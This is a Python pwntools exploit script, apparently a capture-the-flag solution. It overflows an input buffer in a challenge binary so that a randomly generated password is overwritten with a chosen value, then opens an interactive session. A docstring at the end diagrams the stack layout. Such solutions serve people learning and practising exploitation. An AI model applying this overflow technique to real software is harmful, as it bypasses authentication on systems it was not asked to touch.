from pwn import *
from grwnapy.pwn import find_offset


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

if args.REMOTE:
    exe = "/home/grwcha/grwna/.example_elf"
else:
    exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# start
input_buf = 0xd28
pass_buf = 0x26

size = input_buf-pass_buf

io = start()

payload_size = flat([str(size+20).encode()])

io.sendlineafter(b'', payload_size)

payload = flat([
        8*"a",
        b'\x00',
        (size-1)*"a", 
        b'\x00',
                ])
io.sendlineafter(b'', payload)
io.recvuntil(b'')

io.interactive()

"""
Overwrite the random generated password with your chosen password
The start is gotten from ghidra's variable naming

|--------------SIZE------------|
|--INPUT--|------GARBAGE-------|---PASS---|
  9 bytes   size-1 bytes          9 bytes

  it is size-1 because size - 9 + 8 (9 bytes for input + null, 8 for pass not including null)
"""
